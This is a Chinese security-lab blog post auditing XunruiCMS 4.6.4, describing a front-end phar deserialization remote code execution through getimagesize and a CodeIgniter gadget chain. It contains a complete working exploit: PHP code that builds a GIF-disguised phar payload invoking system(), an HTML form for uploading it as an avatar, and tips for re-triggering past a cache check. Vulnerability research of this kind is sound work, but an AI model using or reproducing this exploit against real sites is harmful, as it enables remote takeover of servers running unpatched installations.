#  【代码审计】Xunruicms前台RCE  
原创 p1wy  红细胞安全实验室   2025-06-09 04:45  
  
   
  
# Xunruicms前台RCE  
  
测试环境：phpstudy 7.3.4  
 + windows  
 + Xunruicms 4.6.4  
Xunruicms  
存在一个前台RCE漏洞，这个漏洞在之前很多版本也存在，最新版已修复，漏洞位于dayrui/Fcms/Control/Api/Api.php  
，是一个前台可访问的方法  
  
我们看这个$thumb  
参数这里  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CHia1CpibkpLWrlzXR4QY5HdfQur4XaqblVWwcqSZUutkTF2FlETRcuyw/640?wx_fmt=jpeg "")  
  
  
是由于get  
方法来接受get  
参数的，会进行XSS  
的过滤  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57C48mstpmjVavZRldPkZxplLpxgdKPBcLxoEHJOHKG84D4zIPLCgyDNw/640?wx_fmt=png&from=appmsg "")  
  
如下，但是这并不影响本次漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CK1ciav8qZm0CLKv8Y18lQsBOkOrgaoh1o6ia6Fl3IrfPVquibeUYfRSzw/640?wx_fmt=png&from=appmsg "")  
  
关注到73行  
这里，getimagesize  
，这个函数是可以触发phar协议  
的，进而可以导致phar反序列化RCE  
$img = getimagesize($thumb);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CTOstcKzlZpTmlRxNR5HSILayYP8pYSP2RGHmCnWEQu3GXoFLyZCxlA/640?wx_fmt=png&from=appmsg "")  
  
到这里$thumb  
，除了上面的xss _clean  
的方法过滤XSS  
以外，没有任何过滤的地方，也不会对我们的phar协议  
进行过滤所以不影响  
  
不过注意到这里的if  
语句，如果不符合输入条件是会直接exit  
的  
  
这段代码实际上我感觉存在一个逻辑上的问题。strpos($thumb, 'https://') !== false  
 表示 $thumb  
 包含 https://  
，而 strpos($thumb  
, 'http://') !== false 表示 $thumb 包含 http://。由于 https:// 和 http:// 两者是互斥的，不可能同时存在于一个 URL 中，因此这两个条件的同时成立是无法出现的。  
  
strpos($thumb  
, '/') !== false 检查 $thumb  
 是否包含 /  
，通常 URL 中都会包含/  
来区分域名和路径，这倒是很正常  
```
if (strpos($thumb, 'https://') !== false    && strpos($thumb, '/') !== false    && strpos($thumb, 'http://') !== false) {    exit(图片地址不规范);}
```  
  
所以这里对于phar://xxx  
之类的输入数据，不会进入到这个if  
语句，所以也就不用担心exit  
，那么现在知道了此处是存在反序列化漏洞的，接下来需要找一个链  
  
之前看到网上爆出了一些Xunrui  
的任意文件删除  
的链，不能进行RCE  
，遂自己尝试去找找能触发RCE  
的反序列化的链，后面找到了一条能直接执行命令的链，还有一条文件写入的链，但是文件写入的链对于当前的漏洞环境有些地方需要绕过，这里我先介绍执行命令的链  
# RCE链  
  
为了不拐弯抹角的讲解，我就直接忽略了中间找其他链条的思路和试错过程了，直接说一条成功的链  
  
我们首先找__destruct  
函数，这里$this->redis  
可控，这里选择找一个调用了close方法  
的地方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CKjHyGzKXrK2U05KkLHjUZMNFt2QJM1pR64Xcws4kaO39QHIGqXPtCQ/640?wx_fmt=png&from=appmsg "")  
  
$this->memcached和$this->lockKey  
都是可控的，那么这里就可以调用到某个类的delete  
方法了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CJK6KIWBpelAU0tRfP9Bqfpt3GgewQxYMKb64edh9HHNZCpozveVWPQ/640?wx_fmt=png&from=appmsg "")  
  
这里找到了,这里$this->tempAllowCallbacks  
可控，跟进trigger  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CsYUyOW4icIkL15cSKdd94vH11ibk3yQQzggk6UsehMrY1p6wgvljJRMg/640?wx_fmt=png&from=appmsg "")  
  
这个方法可以通过控制$this->{$event}  
的值来调用本类的某个方法，那么我们就看本类中有没有比较好利用的一些方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57Ct8r45DxJKPCjibibWFNta7iafrlnq1LF3Q5aDZDg6YaV9TcwoXTIFdfEQ/640?wx_fmt=png&from=appmsg "")  
  
找了一圈，看了下validate  
这个方法，看看里面的这个run  
方法，注意这里的$dbGroup  
我们是可控的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CLRiaXnjVyzKtagrwT6tX6vyKk21S1ZePbKWI9UDltzw8ichdOyhGdo6g/640?wx_fmt=png&from=appmsg "")  
  
注意上面$this->cleanValidationRules  
要控制为false  
,否则会进入cleanValidationRules,会对值有影响，避免最后直接返回 true  
了进入不到run  
方法中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CW3SeITX9UVcS3H1D15ZDbAL9lE8OOuBy8K56bUhw5SicZiccILlaRsDA/640?wx_fmt=png&from=appmsg "")  
  
这个run方法里面，$this->rules  
也可控，所以这里foreach  
的$rField  
和$rSetup  
都变得可控，$rules  
的值为$rSetup  
，也可控  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57Co0icIOaS0rh3WSoLc69YXrYL46V5x6BjZbHoibqoXicZciaoWVibkK9hRew/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57Cv2yx1icLrwanJwtw1kqgYbnVptlnOrPGiau62oweG15PyibCyqVBsoWuw/640?wx_fmt=png&from=appmsg "")  
  
这里还有个$value  
是后面比较关键的  
```
$value  =  dot_array_search($rField, $data);
```  
  
dot_array_search  
方法如下，又调用了_array_search_dot  
,$segments  
是$index  
处理分割后的产物，但是我们传入的数据不会满足分隔条件，还是把$segments  
当做$index  
就行  
```
    function dot_array_search(string $index, array $array)    {       $segments = explode('.', rtrim(rtrim($index, '* '), '.'));       return _array_search_dot($segments, $array);    }}
```  
  
跟进_array_search_dot  
，最后的结果其实都是返回一个数组  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57COmwfTwBaPicE0ycGRL7J76nzh5oju0CK5v1Y2LxEwprlylJMmbU9Z2w/640?wx_fmt=png&from=appmsg "")  
  
这是个什么数组呢，我们看前面第一行，$currentIndex  
就是$indexes  
，那么可以理解为返回了$array[$indexes];  
，所以这里如果要控制返回的值，那么传入的第一个参数必须在$arrary  
这个数组里面，并且这个数组中的这个值必须可控  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CS8vOBmZLZVl4SicE2QWBNiawnRicEELKWLLJYibkZZ6jLV8q8L3uJicyOyw/640?wx_fmt=png&from=appmsg "")  
  
那么我们可以关心一下$array  
里面是个什么玩意，不用担心$indexes  
的值，因为它是可控的，就是最初说的$rField  
，既然这样，我们只需要找$array  
有哪些值可控，如果A可控，那么我们就把$indexes  
的值控制为A，这样返回的$array[A]  
就是可控的，$value  
的值也就可控了，这样说可能比较好理解,我们可以看到$array  
其实就是 dot_array_search($rField, $data);  
传进去的$data  
，而这个$data  
刚好够给面子，在run方法中把DBGroup  
加入数组了，而我们之前提过一个“$this->DBGroup”  
我们是可控的，那么这里也就满足了$data['DBGroup']  
可控  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CZViaZPQVkeQxoaHiczSTOGdSdb7ic1WFu8jq2KjxM07fhCPLDXcDuLRfQ/640?wx_fmt=png&from=appmsg "")  
  
所以这里我们只需要把$indexes  
的值控制为DBGroup  
就行了，也就是$rField  
的值控制为DBGroup  
，这就实现了$value  
的值可控  
  
现在，run  
方法里面，$rField  
和$rSetup  
可控，$rules  
的可控,$value  
可控，带着这些条件我们进入processRules  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CFFONhtHLTh2wzgX1ZnaxPW4SQGhZvBFBiaqKRZDmQcHdWcewyN2G0vQ/640?wx_fmt=png&from=appmsg "")  
  
processRules  
的这个地方，就可以通过控制好值来执行命令了，$rules  
的值控制为system  
，$value  
的值为calc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CnrByhWUQGLdbsVibmWT4uBXMeacKf5msW4PQpZmZWvyVC417Vaqn4VQ/640?wx_fmt=png&from=appmsg "")  
  
POC以及复现过程  
```
<?phpnamespace CodeIgniter\Cache\Handlers {    use CodeIgniter\Session\Handlers\MemcachedHandler;    class RedisHandler {        protected $redis;        public function __construct(MemcachedHandler $memcachedHandler) {            $this->redis = $memcachedHandler;        }    }}namespace CodeIgniter\Session\Handlers {    use CodeIgniter\Model;    use CodeIgniter\Validation\Validation;    class MemcachedHandler {        protected $memcached;        public $lockKey;        public function __construct($lockKey = '123', Model $model = null) {            $this->lockKey = $lockKey;            $this->memcached = $model ?: new Model(new Validation());        }    }}namespace CodeIgniter {    use CodeIgniter\Validation\Validation;    abstract class BaseModel {    }    class Model extends BaseModel {        public $validation;        public $tempAllowCallbacks;        public $beforeDelete;        public $validationRules;        public $cleanValidationRules;        public $DBGroup;        public function __construct(Validation $validation,$cmd = 'calc') {  //这里控制执行的命令            $this->validation = $validation;            $this->tempAllowCallbacks = true;            $this->beforeDelete = ['abc' => 'validate'];            $this->validationRules = 'rules';            $this->DBGroup = $cmd;            $this->cleanValidationRules = false;        }    }}namespace CodeIgniter\Validation {    class Validation {        protected $config;        protected $rules = [];        protected $ruleSetFiles;        public function __construct() {            $this->config = $this;            $this->rules = ['DBGroup' => 'system'];            $this->ruleSetFiles = [0 => 'stdClass'];        }    }}namespace {    use CodeIgniter\Cache\Handlers\RedisHandler;    use CodeIgniter\Session\Handlers\MemcachedHandler;    $memcachedHandler = new MemcachedHandler();    $redisHandler = new RedisHandler($memcachedHandler);    $phar = new Phar("shell.phar"); //生成phar文件    $phar->startBuffering();    $phar->setStub("GIF89a"." __HALT_COMPILER(); ?>"); //设置stub    $phar->setMetadata($redisHandler);     $phar->addFromString("test.txt", "test");     $phar->stopBuffering();    //print_r(urlencode(serialize($o)));}
```  
  
  
弹出计算器  
前台注册上传头像  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CX7PyyDib0IX6hBuUZRLBSWhhkVl0Ka1icwQjUtgyaiaicDD3onldRu1A3Q/640?wx_fmt=png&from=appmsg "")  
  
弹出计算器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CmdD5Zfw9iciauYW3WLyrGYE6VBM0UXLd0UCqtfykDWTEcK9vhHIXDolA/640?wx_fmt=png&from=appmsg "")  
  
前台上传图片的时候有坑点，Xunrui  
会对图片内容等进行检测，是否包含php  
字眼，是否符合图片等，否则会出现图片不合规等提示，这个时候得使用gif  
文件头生成phar  
文件，而且如果直接点击功能点上传头像，会出现内容少1kb  
等内容不全问题，导致无法触发反序列化，这里暂且先不分析具体原因了，所以这里根据代码提供另一种上传方式，有兴趣的可以跟一下原因，表单如下，可以无损上传，可以避免上述问题  
```
<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>文件上传表单</title></head><body><h2>上传头像，记得数据包加上cookie</h2><form action="http://127.0.0.1:8053/index.php?s=member&c=account&m=avatar&r=8556" method="POST" enctype="multipart/form-data">    <label for="avatar">选择头像：</label>    <input type="file" id="avatar" name="file" accept="image/*" required><br><br>    <input type="hidden" name="is_form" value="1">    <input type="hidden" name="is_admin" value="0">    <input type="hidden" name="csrf_test_name" value="f9f22ab742616dfe9729f87c41689490">    <button type="submit">上传文件</button></form></body></html>
```  
  
还有个问题是，如果出现第一次能触发，发送第二次数据包发现不能触发（500状态码就是触发了，200没有）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CkiapqqRZN1hPNu7RsW2T1kI2Zickx9VMgzJia2LyKib6QUDicXm6UibWxSUQ/640?wx_fmt=png&from=appmsg "")  
  
这是因为产生了缓存文件，它自动帮你生成了一个二维码文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CnYJCFN669Qzgk4KZ68Fn60icmsuuM44ewAibHNDJYmPCkBdtmAzDiamvQ/640?wx_fmt=png&from=appmsg "")  
  
所以就直接进入了if语句，那么这里你就会提问了，我再上传一个图片不就行了？但是上传的图片都会被命名为当前uid.png，没必要太麻烦。其实我们可以看到这个文件是根据get请求的这四个值来生成的，那么只需要改一下get参数中其他的值就行了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CSkOppTy50XUff5e4OMHfYOcTjg5NKBkYX2r8kvMhr9Vgl4giaiaNIndg/640?wx_fmt=png&from=appmsg "")  
  
再次触发  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DibMxurmMHzbdGdvt8Ad0FVJPfLLpC57CB72y4LYyKwG9U7Acib8JqgZuZh3KCtIibJ1WNibawYNYHEN2roGz0Drpw/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
免责声明  
  
由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。红细胞安全实验室拥有对此文章的修改和解释权。  
如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容， 不得以任何方式将其用于商业目的。  
  
  
文末福利  
  
团队官网：https://redcellsec.cn/，现在我们已经建立了红细胞安全实验室技术交流群，希望各位师傅能积极交流、一起学习，共同营造网络安全良好技术氛围，目前星球是完全免费的，旨在技术交流分享，目前群聊大于200人无法再通过二维码加入交流群，想加入技术交流群的师傅可以通过公众号后台获取邀请链接，进入群聊后私信群主或者其他师傅加入星球交流，后续会不定期在星球内部或公众号上分享一些实战干货或者实用的工具以及资讯，希望能看到更多师傅们一起来交流行业前沿技术！  
  
